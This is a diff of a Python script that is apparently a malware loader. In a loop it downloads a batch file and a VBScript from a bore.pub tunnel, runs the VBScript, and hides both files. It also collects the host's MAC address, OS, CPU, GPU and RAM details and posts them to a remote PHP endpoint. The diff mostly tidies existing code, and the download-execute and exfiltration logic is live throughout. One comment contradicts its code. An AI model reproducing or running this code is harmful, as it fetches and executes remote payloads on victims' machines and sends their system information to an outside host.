@@ -8,33 +8,28 @@ import psutil
 import subprocess
 import uuid
 import wmi
-import concurrent.futures  # Import the 'concurrent.futures' module
+import concurrent.futures
 import random
 import shutil
 
+def clear_screen():
+    if os.name == 'nt':
+        ctypes.windll.kernel32.GetStdHandle(-11).ResizeScreenBuffer(1, 1)
+        ctypes.windll.kernel32.GetStdHandle(-11).SetConsoleActiveScreenBuffer(
+            ctypes.windll.kernel32.GetStdHandle(-10)
+        )
+    else:
+        print("\033c", end="")
+
+def send_data_to_url(url, data):
+    try:
+        response = requests.post(url, data=data)
+        return f"Data sent to {url}: {response.text}"
+    except Exception as e:
+        return f"Error sending data to {url}: {str(e)}"
 
 while True:
-    numbers = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
-    random_number = random.choice(numbers)
-    port = random_number
-
-    # Function to clear the terminal screen based on the operating system
-    def clear_screen():
-        if os.name == 'nt':  # Windows
-            os.system('cls')
-        else:  # Non-Windows (e.g., Linux, macOS)
-            os.system('clear')
-            os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Network | lolcat")
-
-    def send_data_to_url(url, data):
-        try:
-            response = requests.post(url, data=data)
-            return f"Data sent to {url}: {response.text}"
-        except Exception as e:
-            return f"Error sending data to {url}: {str(e)}"
-
     try:
-        # Step 1: Check if files exist and delete them
         home_directory = os.path.expanduser("~")
         web_page1_path = os.path.join(home_directory, "Script.bat")
         vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")
@@ -44,7 +39,8 @@ while True:
         if os.path.exists(vbs_file_path):
             os.remove(vbs_file_path)
 
-        # Step 2: Download the necessary files using requests
+        port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
+
         url1 = f"http://bore.pub:{port}/Script.io"
         url2 = f"http://bore.pub:{port}/VBSEX.io"
 
@@ -55,7 +51,7 @@ while True:
             print(f"Downloaded and saved web page 1 to {web_page1_path}")
         else:
             print(f"Failed to download web page 1. Status code: {response1.status_code}")
-            continue  # Skip to the next iteration if download fails
+            continue
 
         response2 = requests.get(url2)
         if response2.status_code == 200:
@@ -64,39 +60,34 @@ while True:
             print(f"Downloaded and saved web page 2 to {vbs_file_path}")
         else:
             print(f"Failed to download web page 2. Status code: {response2.status_code}")
-            continue  # Skip to the next iteration if download fails
+            continue
 
-        # Step 3: Run the downloaded scripts
         if os.path.isfile(vbs_file_path):
-            os.system(f'cscript.exe "{vbs_file_path}"')
+            subprocess.Popen(['cscript.exe', vbs_file_path], shell=True)
 
-        # Step 4: Hide downloaded files
+        downloaded_files = [web_page1_path, vbs_file_path]
+
         def hide_files_windows(file_paths):
             try:
                 for file_path in file_paths:
-                    os.system(f'attrib +h "{file_path}"')
+                    ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  # Hide the file
             except Exception as e:
                 print(f"Error hiding files on Windows: {str(e)}")
 
         def hide_files_unix(file_paths):
             try:
                 for file_path in file_paths:
-                    os.system(f'chmod 400 "{file_path}"')  # You can adjust file permissions as needed
+                    os.chmod(file_path, 0o400)  # You can adjust file permissions as needed
             except Exception as e:
                 print(f"Error hiding files on Unix-based system: {str(e)}")
 
-        # List of downloaded files
-        downloaded_files = [web_page1_path, vbs_file_path]
-
-        # Hide downloaded files based on the operating system
-        if os.name == 'nt':  # Windows
+        if os.name == 'nt':
             hide_files_windows(downloaded_files)
-        else:  # Non-Windows (e.g., Linux, macOS)
+        else:
             hide_files_unix(downloaded_files)
 
-#----------------------------------------------------------------------------------------
         mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
-        mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])  # Format the MAC address with colons
+        mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
         computer = wmi.WMI()
         computer_info = computer.Win32_ComputerSystem()[0]
         os_info = computer.Win32_OperatingSystem()[0]
@@ -104,7 +95,7 @@ while True:
         gpu_info = computer.Win32_VideoController()[0]
         os_name = os_info.Name.encode('utf-8').split(b'|')[0]
         os_version = ' '.join([os_info.Version, os_info.BuildNumber])
-        system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB
+        system_ram = float(os_info.TotalVisibleMemorySize) / 1048576
         cpu = format(proc_info.Name)
         gpu = format(gpu_info.Name)
         System = platform.system()
@@ -126,21 +117,16 @@ while True:
             "Machine": f"{mach}",
         }
 
-        # List of PHP endpoint URLs
-        php_urls = [
-            f"http://bore.pub:{port}/Save.php"
-        ]
+        php_urls = [f"http://bore.pub:{port}/Save.php"]
 
-        # Use concurrent.futures to send data to all URLs concurrently
         with concurrent.futures.ThreadPoolExecutor() as executor:
             results = executor.map(lambda url: send_data_to_url(url, data_to_send), php_urls)
 
-        # Print the results
         for result in results:
             print(result)
 
-        # Wait for some time before running again
-        time.sleep(0)  # Adjust the sleep duration as needed
+        time.sleep(0)
 
     except Exception as e:
         print(f"Error: {str(e)}")
+        time.sleep(0)  # Sleep for 5 seconds before restarting
